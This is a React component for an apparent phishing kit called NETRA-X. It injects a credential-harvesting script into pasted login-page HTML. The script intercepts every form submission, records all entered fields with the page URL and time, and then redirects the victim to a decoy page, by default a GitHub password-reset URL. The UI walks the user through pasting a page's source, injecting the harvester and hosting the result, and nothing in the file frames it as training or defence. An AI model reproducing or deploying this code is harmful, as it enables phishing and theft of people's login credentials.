
'use client';

import { useState } from 'react';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { z } from 'zod';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Loader2, Globe, Wand, StopCircle } from 'lucide-react';
import { useToast } from '@/hooks/use-toast';
import { Textarea } from './ui/textarea';

const pageClonerSchema = z.object({
  htmlContent: z.string().min(100, { message: 'Please paste a valid HTML document.' }),
  redirectUrl: z.string().url({ message: 'Please enter a valid URL for redirection.' }),
});

const getHarvesterScript = (redirectUrl: string) => `
<script>
    function captureAndRedirect(form) {
        try {
            const formData = new FormData(form);
            const credentials = {};
            let capturedData = false;
            
            for (let [key, value] of formData.entries()) {
                if (typeof value === 'string' && value.length > 0) {
                    credentials[key] = value;
                    capturedData = true;
                }
            }
            
            if (capturedData) {
                const entry = {
                    ...credentials,
                    source: window.location.href,
                    timestamp: new Date().toISOString()
                };
                const storageKey = 'netra-captured-credentials';
                try {
                    const existingData = JSON.parse(localStorage.getItem(storageKey) || '[]');
                    const updatedData = [...existingData, entry];
                    localStorage.setItem(storageKey, JSON.stringify(updatedData));
                    
                    // Fire a custom event to notify other components (like the harvester table)
                    window.dispatchEvent(new StorageEvent('storage', {
                        key: storageKey,
                        newValue: JSON.stringify(updatedData)
                    }));

                } catch(e) {
                    console.error('NETRA-X Harvester: Could not save to localStorage.', e);
                }
            }
        } catch (e) {
            console.error('NETRA-X Harvester: Error capturing form data.', e);
        } finally {
            setTimeout(() => {
                window.location.href = '${redirectUrl}';
            }, 150);
        }
    }

    document.addEventListener('submit', function(e) {
        if (e.target && e.target.tagName === 'FORM') {
            e.preventDefault();
            e.stopPropagation();
            captureAndRedirect(e.target);
        }
    }, true);
</script>
`;

type LoginPageClonerProps = {
  onHostPage: (htmlContent: string) => void;
};

export function LoginPageCloner({ onHostPage }: LoginPageClonerProps) {
  const { toast } = useToast();
  const [modifiedHtml, setModifiedHtml] = useState<string | null>(null);
  const [isHosting, setIsHosting] = useState(false);

  const form = useForm<z.infer<typeof pageClonerSchema>>({
    resolver: zodResolver(pageClonerSchema),
    defaultValues: {
      htmlContent: '',
      redirectUrl: 'https://github.com/password_reset',
    },
  });
  
  const resetState = () => {
      setModifiedHtml(null);
      setIsHosting(false);
  }

  const onClonerSubmit = (values: z.infer<typeof pageClonerSchema>) => {
    resetState();
    
    let html = values.htmlContent;
    const harvesterScript = getHarvesterScript(values.redirectUrl);
      
    // Inject the credential harvester script before the closing body tag
    if (html.includes('</body>')) {
      html = html.replace(/<\/body>/i, `${harvesterScript}</body>`);
    } else {
      html += harvesterScript;
    }

    setModifiedHtml(html);
    toast({ title: "HTML Prepared", description: "Credential harvester has been injected." });
  };

  const handleHostPage = async () => {
    if (!modifiedHtml) return;
    setIsHosting(true);
    // Instead of a server call, we now pass the content up to the parent page.
    onHostPage(modifiedHtml);
    // The parent page will handle navigation, so we don't need to do anything else here.
  };

  return (
      <Card>
        <CardHeader>
          <CardTitle>Page Cloner & Host</CardTitle>
          <CardDescription>Paste HTML source code to inject a credential harvester and host it.</CardDescription>
        </CardHeader>
        <CardContent>
          <Form {...form}>
            <form onSubmit={form.handleSubmit(onClonerSubmit)} className="space-y-4">
              <FormField control={form.control} name="htmlContent" render={({ field }) => ( 
                <FormItem> 
                  <FormLabel>1. Paste Page HTML</FormLabel>
                  <FormControl>
                    <Textarea placeholder="Right-click on a page, 'View Page Source', and paste the HTML here." {...field} className="h-40 font-mono" />
                  </FormControl>
                  <FormMessage />
                </FormItem> 
              )}/>
              <FormField control={form.control} name="redirectUrl" render={({ field }) => ( <FormItem> <FormLabel>2. Redirect URL (after capture)</FormLabel> <FormControl><Input placeholder="https://example.com/login_failed" {...field} /></FormControl> <FormMessage /> </FormItem> )}/>
              <Button type="submit">
                <Wand className="mr-2 h-4 w-4" />
                Inject Harvester
              </Button>
            </form>
          </Form>
        </CardContent>
        {modifiedHtml && (
          <CardFooter className="flex-col gap-4">
            <Button onClick={handleHostPage} disabled={isHosting} className="w-full">
                {isHosting ? <Loader2 className="mr-2 h-4 w-4 animate-spin" /> : <Globe className="mr-2 h-4 w-4" />}
                3. Preview & Host Page
            </Button>
             <Button onClick={resetState} variant="destructive" className="w-full">
                <StopCircle className="mr-2 h-4 w-4"/> Reset
            </Button>
          </CardFooter>
        )}
      </Card>
  );
}
